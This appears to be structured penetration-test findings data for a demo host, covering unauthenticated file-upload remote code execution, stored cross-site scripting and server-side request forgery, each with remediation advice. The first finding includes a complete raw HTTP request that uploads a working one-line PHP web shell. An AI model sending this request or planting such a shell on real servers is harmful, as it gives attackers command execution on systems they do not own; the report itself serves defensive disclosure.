findings.title: Unauthenticated remote code execution in file upload handler
findings.description: The /upload endpoint accepts a crafted multipart payload whose filename is written to disk without sanitisation, allowing a PHP web shell to be dropped and executed.
findings.remediation: Validate and normalise the uploaded filename, store uploads outside the web root, and disable script execution in the upload directory.
findings.evidence_explanation: Uploaded a PHP web shell and executed `id` to confirm code execution as www-data.
findings.raw_request:
POST /upload HTTP/1.1
Host: demo.darkmoon.example.com
Content-Type: multipart/form-data; boundary=x

--x
Content-Disposition: form-data; name="file"; filename="shell.php"

<?php system($_GET['cmd']); ?>
--x--

findings.title: Stored cross-site scripting in profile display name
findings.description: The display name field is rendered without output encoding on the public profile page, allowing stored JavaScript to run in the context of any visitor.
findings.remediation: HTML-encode user-controlled values on output and apply a strict Content-Security-Policy.
findings.evidence_explanation: Set the display name to a script payload and observed it execute when loading another user's view of the profile.

findings.title: Server-side request forgery in URL preview feature
findings.description: The link preview service fetches arbitrary user-supplied URLs server-side; internal metadata endpoints may be reachable.
